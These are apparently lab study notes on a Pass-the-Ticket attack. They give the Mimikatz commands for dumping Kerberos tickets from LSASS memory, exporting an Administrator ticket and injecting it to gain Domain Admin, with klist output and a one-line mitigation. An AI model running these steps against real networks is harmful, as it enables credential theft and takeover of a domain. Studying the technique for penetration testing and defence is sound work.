# Pass the Ticket w/ Mimikatz
Post-exploitation tool commonly used for dumping user credentials inside of an Active Directory network.
- Used to dump a TGT from LSASS memory

## Pass the Ticket Overview
- Dumping TGT from LSASS memory of the machine
- `Local Security Authority Subsystem Service` is a memory process that stores credentials on an Active Directory server and can store Kerberos tickets
- Dump Kerberos tickets from LSASS memory
- `.kirbi` ticket can be used to gain Domain Admin if a Domain Admin account is in the LSASS memory
- Escalate to Domain Admin if you dump Domain Admin ticket + impersonate that ticket using Mimikatz

![Alt text](<../../Images/LSASS Memory.png>)

## Mimikatz & Dump Tickets
<pre> mimikatz.exe </pre>

<pre> mimikatz# privilege::debug </pre>  (output '20 OK' means we have admin privileges to run Mimikatz)

<pre> mimikatz# sekurlsa::tickets /export </pre> (export .kirbi tickets into current working directory)

- Recommend to look for Administrator ticket from krbtgt

![Alt text](<../../Images/kirbi tickets.png>)

## Pass the Ticket w/ Mimikatz
Perform a Pass the Ticket with our ticket to gain Domain Admin privileges.

<pre> mimikatz# kerberos::ptt <ticket> </pre> (cache and impersonate ticket)

<pre> mimikatz# kerberos::ptt [0;6ad85]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi </pre>

List cached tickets

<pre> controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist

Cached Tickets: (1)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/12/2023 13:12:17 (local)
        End Time:   9/12/2023 23:12:17 (local)
        Renew Time: 9/19/2023 13:12:17 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

        </pre>

- Impersonate ticket
- Same permissions as TGT

## Pass the Ticket Mitigation
- Do not let Domain Admin log on to anything except Domain Controller